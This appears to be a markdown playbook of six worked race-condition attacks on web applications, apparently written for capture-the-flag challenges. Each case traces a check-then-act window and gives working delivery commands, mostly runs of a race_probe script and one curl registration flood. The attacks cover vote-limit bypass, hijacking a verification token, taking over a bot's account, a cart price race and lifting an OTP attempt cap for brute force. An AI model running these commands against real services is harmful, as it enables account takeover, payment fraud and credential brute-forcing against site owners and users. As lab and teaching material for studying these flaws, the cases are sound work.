# Case studies deep — the exhaustive worked examples

Each case worked end-to-end: the discovery, the window, the delivery, the
result, and the lesson. Long-form companion to `case-studies.md`.

---

## Case 1 — The single-packet limit bypass

### Discovery

A `POST /api/vote` endpoint. The response to a second vote is `409 already
voted` — the check exists. Source shows `SELECT count → if <1 → INSERT` with
no `UNIQUE(user_id, post_id)`.

### The window

```text
SELECT count(*) FROM votes WHERE user_id=? AND post_id=?   -- read
if count < 1:                                              -- decide
    INSERT INTO votes (user_id, post_id) VALUES (?,?)       -- write
    UPDATE posts SET score = score + 1                      -- tally
```

Two statements; the check is code-only.

### The delivery

A `ThreadPoolExecutor` flood returned one `201` and 19 `409`s — the burst
arrived too spread out; the first vote committed before the rest read.

Switching to `race_probe`'s barrier — all requests primed, released in one
flush:

```bash
python3 tools/web/race_probe.py --url "$BASE/api/vote" \
  --method POST --body '{"post":1}' -H "Cookie: $SESSION" \
  --concurrency 20 --count 20 --baseline-count 4 \
  --signature-mode status --write-ack --challenge <name>
```

### The result

`max_in_flight` = 20; the split: `[201, 201, 409×18]`. `GET /api/post/1`
shows `score: +2` for one voter.

### The lesson

The window was real but narrow — the *delivery mechanic* was the
differentiator. A flood's start-spread exceeded the window; a single-packet
barrier didn't.

## Case 2 — The profile-token cross (the interleave win)

### Discovery

`POST /profile {email}` → mints a verification token, commits the email
change, re-reads the address, calls `sendEmail`. The mint and the send are in
different functions.

### The window

```text
mint token T for email_e                      -- in function A
UPDATE profile SET email=e, token=T            -- commit
re-read profile.email                          -- in function B (a second query)
sendEmail(profile.email, T)                    -- the send, outside any txn
```

An interleaved second update commits between the commit and the re-read.

### The delivery

A burst couldn't land — the window is between two specific points inside one
request's processing. The interleave:

```text
A: POST /profile {email: a@x}  — withhold the last body byte; A's handler is in-flight
B: POST /profile {email: b@y}  — complete; commits before A re-reads
A: release the last byte — A re-reads profile.email → gets b@y → sendEmail(b@y, Ta)
```

### The result

The token minted for `a@x` arrives in the `b@y` mailbox — which you control.

### The lesson

The narrow-window races need the *interleave*, not the burst — and the
widest, most reliable windows have *work between* the commit and the re-read
(`sendEmail` is the giveaway).

## Case 3 — The registration race against a bot

### Discovery

A bot's startup does `registerUser(student@domain)` at boot. The register
endpoint is `SELECT email → INSERT` with no unique constraint.

### The window

The check-then-insert — but the "second request" is the bot's own startup
step. The race is *your* register against the bot's timing.

### The delivery

```bash
for i in $(seq 1 60); do
  curl -s -o /dev/null -X POST "$BASE/api/register" \
    -d '{"email":"student@domain","password":"yours"}' &
done; wait
```

### The result

`POST /api/login` with your password returns 200 — you own the account the
bot thinks it owns. Its login fails; its shared token cookie stays bound to
your account; its flag-submit lands in your mailbox.

### The lesson

Race the *identity* a system actor will claim — the highest-value race
primitive, because the actor then does privileged work on your account.

## Case 4 — The cart-then-pay price race

### Discovery

`checkout` computes the order total; `pay` charges it. The cart record is
shared; the total is stored on the order at checkout.

### The window

```text
checkout: read cart → compute total → order.total = T
pay:      read order.total → charge T
```

A `cart/add` landing between checkout's compute and pay's charge.

### The delivery

```bash
python3 tools/web/race_probe.py \
  --url "$BASE/pay" --method POST -H "Cookie: $SESSION" \
  --url-b "$BASE/cart/add" --method-b POST --body-b '{"item":"expensive"}' \
  --concurrency 2 --count 10 --baseline-count 4 --write-ack
```

### The result

`GET /api/order/1` shows `total: $0` but `items: [expensive]` — the charge
was for the pre-add total.

### The lesson

The widest windows are the *multi-request* ones — the "transaction" is a
session record shared across steps.

## Case 5 — The OTP attempt-cap race

### Discovery

`POST /verify {code}` → `SELECT attempts → if <5 → increment → compare`. The
cap is 5; the OTP is 4 digits.

### The window

```text
SELECT attempts FROM otps WHERE user=?     -- read
if attempts < 5:                           -- decide
    UPDATE otps SET attempts = attempts+1  -- write
    if code == supplied: verify
```

### The delivery

```bash
python3 tools/web/race_probe.py --url "$BASE/api/verify" \
  --method POST --body '{"code":"0000"}' -H "Cookie: $SESSION" \
  --concurrency 20 --count 20 --baseline-count 6 \
  --signature-mode status --challenge <name>
```

### The result

Baseline: attempts 1-5 return `invalid`, 6+ return `locked`. Raced: all 20
returned `invalid` — the cap never engaged. 20 attempts for the price of a
cap-5 policy.

### The lesson

A counter race doesn't bypass the check — it buys *more tries*. Combine with
a weak/short OTP for the brute-force window.

## Case 6 — The stale-read privilege ride

### Discovery

`GET /api/me` reads a cached `verified` flag; `POST /api/revoke` writes the
false value and invalidates the cache — but the invalidate is *after* the
write.

### The window

```text
POST /revoke: UPDATE user SET verified=false → cache.delete(user)
GET /me:      cache.get(user) → returns stale verified=true if it lands in the gap
```

### The delivery

```bash
python3 tools/web/race_probe.py \
  --url "$BASE/api/me" --method GET -H "Cookie: $SESSION" \
  --url-b "$BASE/api/revoke" --method-b POST -H "Cookie: $SESSION" \
  --concurrency 2 --count 10 --baseline-count 4
```

### The result

A `GET` returns `verified: true` *after* the revoke committed — a privileged
view trusted past its validity.

### The lesson

Not every race is a double-write — a *stale read* the app trusts is the
read-only TOCTOU.

## The case → delivery → lesson table

| Case | Delivery | Lesson |
|---|---|---|
| vote | single-packet barrier | narrow window → tight delivery |
| profile token | last-byte interleave | work-in-window → interleave |
| register | startup hammer | race the actor's identity |
| cart/pay | `--url-b` steps | the session record is the state |
| otp cap | burst | a counter buys more tries |
| stale-read | `--url-b` GET+POST | a trusted stale view is TOCTOU |
